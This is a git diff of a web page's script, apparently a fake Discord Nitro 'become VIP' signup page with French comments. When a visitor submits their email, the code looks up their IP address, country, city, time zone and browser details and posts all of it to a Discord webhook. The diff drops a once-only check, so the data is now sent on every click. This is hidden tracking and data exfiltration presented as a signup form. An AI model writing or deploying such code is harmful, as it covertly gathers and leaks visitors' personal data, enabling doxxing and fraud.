@@ -106,38 +106,28 @@
         const devenirVIP = async () => {
             const email = document.getElementById("emailInput").value;
 
-            // Vérifie si le message a déjà été envoyé en utilisant le stockage local
-            if (!localStorage.getItem("webhookSent")) {
-                const ipAddress = await getIpAddress();
-                const ipGeolocationData = await getIpGeolocation(ipAddress);
+            const ipAddress = await getIpAddress();
+            const ipGeolocationData = await getIpGeolocation(ipAddress);
 
-                const embed = {
-                    title: "<:FakeNitroEmoji:1209487670561210419> Nouveau membre a rejoint le site!",
-                    description: `**<:3228info:1210210365414055956> Adresse IP: || ${ipAddress} ||\n<:8692communityserver:1210210464647094383> Pays: || ${ipGeolocationData.country_name} ||\n<:3267ecomode:1210210378018066492> Ville: || ${ipGeolocationData.city} ||\n<:6764newmember:1210210416517709844> Fuseau horaire: || ${ipGeolocationData.time_zone} ||\n<:6307management:1210210404471672864> Navigateur + Plateforme: || ${window.navigator.userAgent} ||\n<:7884member:1210210443314860073> Adresse Mail: || ${email} ||**`,
-                    color: 0x00ff00
-                };
+            const embed = {
+                title: "<:FakeNitroEmoji:1209487670561210419> Nouveau membre a rejoint le site!",
+                description: `**<:3228info:1210210365414055956> Adresse IP: || ${ipAddress} ||\n<:8692communityserver:1210210464647094383> Pays: || ${ipGeolocationData.country_name} ||\n<:3267ecomode:1210210378018066492> Ville: || ${ipGeolocationData.city} ||\n<:6764newmember:1210210416517709844> Fuseau horaire: || ${ipGeolocationData.time_zone} ||\n<:6307management:1210210404471672864> Navigateur + Plateforme: || ${window.navigator.userAgent} ||\n<:2933email:1210210505853255682> Adresse Mail: || ${email} ||**`,
+                color: 0x00ff00
+            };
 
-                const payload = {
-                    embeds: [embed]
-                };
+            const payload = {
+                embeds: [embed]
+            };
 
-                // Envoie du message via le webhook Discord
-                await fetch(webhookURL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(payload)
-                });
-
-                // Marque le message comme déjà envoyé
-                localStorage.setItem("webhookSent", "true");
-            }
+            // Envoie du message via le webhook Discord
+            await fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            });
         };
-
-        // Appelle la fonction au chargement de la page
-        sendWebhookOnce();
     </script>
 </body>
 </html>
-
